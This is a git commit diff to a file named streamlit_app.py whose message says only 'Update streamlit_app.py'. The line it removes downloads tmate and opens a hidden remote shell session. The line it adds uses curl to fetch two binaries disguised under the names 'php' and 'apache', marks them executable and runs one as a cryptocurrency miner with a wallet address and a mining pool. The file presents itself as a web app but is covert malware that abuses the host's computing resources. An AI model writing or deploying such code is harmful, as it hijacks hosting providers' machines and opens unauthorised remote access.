b35a15b35a754abdb8a9d9198cdea2ac9e8a7187
fariisna8 <fariisna8@gmail.com>
2024-08-19 11:29:54 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,3 +1,3 @@
 import os
 os.system('apt-get install wget')
-os.system('wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz && tar -xf tmate-2.4.0-static-linux-amd64.tar.xz && cd tmate-2.4.0-static-linux-amd64 &&./tmate -S /tmp/tmate.sock new-session -d && ./tmate -S /tmp/tmate.sock wait tmate-ready && ./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'')
+os.system('curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet SaLvsBu6oFag1w7AWnq7MJe1kiEj39WXE7RwTNzRH8sU2xy3sSxZfwQjLHRqLUu32NTfEqd7xKhMwK3t3V2Tix9EZUtghWuUwyN -pool1 pool.hashvault.pro:443 -rigName CPU-3')
